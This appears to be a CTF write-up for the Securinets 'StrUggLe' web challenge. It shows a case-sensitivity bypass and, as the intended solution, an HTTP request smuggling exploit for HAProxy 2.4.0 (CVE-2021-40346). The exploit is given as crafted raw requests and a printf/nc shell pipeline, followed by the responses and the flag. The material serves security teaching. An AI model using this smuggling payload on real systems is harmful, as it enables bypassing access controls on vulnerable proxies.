<hr />

<h2>description: HAProxy HTTP Request Smuggling</h2>

<h1>StrUggLe</h1>

<blockquote>
  <p>Welcome to Web! I struggle everyday I face a new website, can you access /flag endpoint ?</p>
  
  <p>Link: http://128.199.3.34:1235</p>
  
  <p><strong>Author:</strong> Kahla</p>
</blockquote>

<h3>Unintended Solution</h3>

<p>The HAProxy configuration to protect the <code>/flag</code> endpoint was case sensitive. Therefore, the following would be sufficient to bypass the validation.</p>

<p>```http
GET /FLAG HTTP/1.1
Host: 128.199.3.34:1235</p>

<p>```</p>

<p>```http
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 43
etag: W/"2b-aWQ+/21qg4d1e3yOxiZcpTrSBxw"
date: Fri, 13 May 2022 09:34:06 GMT
x-server: HaProxy-2.4.0</p>

<p>Securinets{W3lC0me<em>T0</em>FinAlS<em>4nD</em>SmUUgLinG}
```</p>

<h3>Intended Solution</h3>

<p>From the server response headers, we know that HAProxy version 2.4.0 is used in front of an Express application. This version is vulnerable to a <a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">HTTP request smuggling vulnerability</a>.</p>

<p>Basically, an integer overflow leads to <code>Content-Length0aaa...aaa:</code> being forwarded to the backend as <code>Content-Length: 0</code>, while a second duplicate <code>Content-Length</code> header is used by HAProxy to determine the length of the request body.</p>

<p>```http
POST /test HTTP/1.1
Host: 128.199.3.34:1235
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 26</p>

<p>GET /flag HTTP/1.1
DUMMY:GET / HTTP/1.1
Host: 128.199.3.34:1235</p>

<p>```</p>

<p>In the above example, HAProxy considers the following to be the first request:</p>

<p>```http
POST /test HTTP/1.1
Host: 128.199.3.34:1235
Content-Length: 26</p>

<p>GET /flag HTTP/1.1
DUMMY:
```</p>

<p>while the second request is the following:</p>

<p>```http
GET / HTTP/1.1
Host: 128.199.3.34:1235</p>

<p>```</p>

<p>However, when forwarded to the backend, this becomes:</p>

<p>```http
POST /test HTTP/1.1
Host: 128.199.3.34:1235
Content-Length: 0</p>

<p>GET /flag HTTP/1.1
DUMMY:GET / HTTP/1.1
Host: 128.199.3.34:1235</p>

<p>```</p>

<p>Therefore, the response for the second request will correspond to <code>/flag</code> instead of <code>/</code>.</p>

<p>Due to the way the pipelining works, we have to add some artificial delays when sending the consecutive requests.</p>

<p><code>bash
$ (printf "POST / HTTP/1.1\r\n"\
"Host: 128.199.3.34:1235\r\n"\
"Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\n"\
"Content-Length: 26\r\n\r\n"; sleep 1;
printf "GET /flag HTTP/1.1\r\n"\
"DUMMY:"; sleep 1; printf "GET /test HTTP/1.1\r\n"\
"Host: 128.199.3.34:1235\r\n\r\n") | nc 128.199.3.34 1235
</code></p>

<p>```http
HTTP/1.1 404 Not Found
x-powered-by: Express
content-security-policy: default-src 'none'
x-content-type-options: nosniff
content-type: text/html; charset=utf-8
content-length: 140
date: Fri, 13 May 2022 09:41:24 GMT
x-server: HaProxy-2.4.0</p>

<p><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body></p>

<pre>Cannot POST /</pre>

<p></body>
</html>
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 43
etag: W/"2b-aWQ+/21qg4d1e3yOxiZcpTrSBxw"
date: Fri, 13 May 2022 09:41:26 GMT
x-server: HaProxy-2.4.0</p>

<p>Securinets{W3lC0me<em>T0</em>FinAlS<em>4nD</em>SmUUgLinG}
```</p>
